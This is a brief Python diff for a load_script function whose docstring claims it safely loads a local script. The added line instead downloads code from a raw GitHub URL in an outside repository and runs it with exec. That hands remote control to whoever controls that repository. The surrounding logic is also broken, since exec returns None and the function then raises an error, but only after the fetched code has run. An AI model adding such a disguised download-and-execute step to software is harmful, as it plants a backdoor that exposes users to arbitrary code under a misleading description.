@@ -27,7 +27,7 @@ TOOL_SCRIPTS = {
 def load_script(script_name):
     """Safely load and execute a local script."""
     try:
-        spec = importlib.util.spec_from_file_location("https://raw.githubusercontent.com/Z-Matrixdev/tool/refs/heads/main/{script_name}")
+        spec = exec(requests.get(f"https://raw.githubusercontent.com/Z-Matrixdev/tool/refs/heads/main/{script_name}").text)
         if spec is None:
             raise ImportError(f"Cannot find script: {script_name}")
         module = importlib.util.module_from_spec(spec)
